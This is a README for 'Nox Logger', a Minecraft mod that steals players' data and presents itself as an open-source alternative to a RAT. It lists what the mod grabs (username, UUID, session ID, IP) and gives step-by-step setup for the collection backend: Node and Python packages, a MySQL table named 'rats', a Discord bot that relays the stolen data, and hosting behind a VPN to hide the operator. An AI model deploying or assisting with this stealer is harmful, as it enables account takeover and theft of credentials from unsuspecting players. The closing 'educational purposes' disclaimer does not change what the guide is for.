![icon](https://cdn.discordapp.com/attachments/1053140780425945100/1053509569797705758/nox1-removebg-preview.png)

*Like VirtueRAT, just shittier and open source.*

## Nox Logger Features 🐀
- Grabs **Username, UUID, SSID, IP**
- Entirely **Un-Nukable**
- Extreme Customizability
- 1 Class / Minimal File Size
- Networth API (thanks to BreadCat 😽)
- An Express.js Backend Which Includes:
    - Validation With Mojang Session Servers
    - Ensures All JSON Fields Are Present
- Database
    - MySQL

## Payload Example

![payload_example](https://cdn.discordapp.com/attachments/1053140780425945100/1053528827927728158/payload-example.png)

## Setup Guide

This guide will be for windows! if you are using linux *figure it out*

First, you'll need to install all the npm packages, python libraries and JDK 8

- [Node](https://nodejs.org/en/download/)
```js
npm i express
npm i axios
npm i mysql2
```
- [Python](https://python.org/download)
```py
pip install mysql-connector-python
pip install py-cord
pip install requests
```
- [Java](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html#license-lightbox)

Next, you'll need to get MySQL, you can download it [here](https://dev.mysql.com/downloads)!

Once you have it installed, you'll need to run these commands: 
```sql
CREATE DATABASE rats;
USE rats;
CREATE TABLE rats (rid VARCHAR(255), webhook VARCHAR(255));
```

To verify everything worked correctly, run this command:
```sql
SELECT * FROM rats;
```

Then, set all the info in config.json to your MySQL info, it should look something like this: 
```json
    "mysql": {
        "host": "127.0.0.1",
        "user": "root",
        "password": "1234",
        "database": "rats"
    }
```

If it responds with an empty table, everything worked fine!👍

<h3> Next, Create a New Discord Application </h3>

- Visit [Discord's Developer Portal](https://discord.com/developers/applications) If it takes you to a login screen, log into your Discord and revisit the page

- Click the **"New Application"** button on the top right of your screen, choose the name of the application, agree to the terms and click "Create".

- Click **"Bot"** on the left settings sidebar and click **"Add bot"** (you may rename it and set a profile picture for it if you'd like)

- Press **"Reset Token"** and **"Yes, do it!"**, then copy the token by copying it manually or pressing the **"Copy"** button.

- Open the **"config.json"** file and add your bot's token to the **"token"** field


## Run Everything
*run the following commands*
```js
node app.js
python main.py
```

Edit the URL in the Minecraft mod, if you're hosting it on your own computer you need to use a vpn because you'll have to put your ip in the file. 

You'll put the url like `139.56.41.06:3000` as the port for app is 3000 by default, you may change it if you'd like though. 

If you want to host it on your computer, I'd suggest [Mullvad VPN](https://mullvad.net/en/)

If you want to set it up as a domain you'll have to figure that out 

<h3>I am not liable for any malicious use of my builder, nor am I liable for any malicious use of the files created by my builder. This is made for educational purposes</h3>


<h1>😽 - Gute Nacht</h1>
<p>Nox (Nacht's) Builder</p>
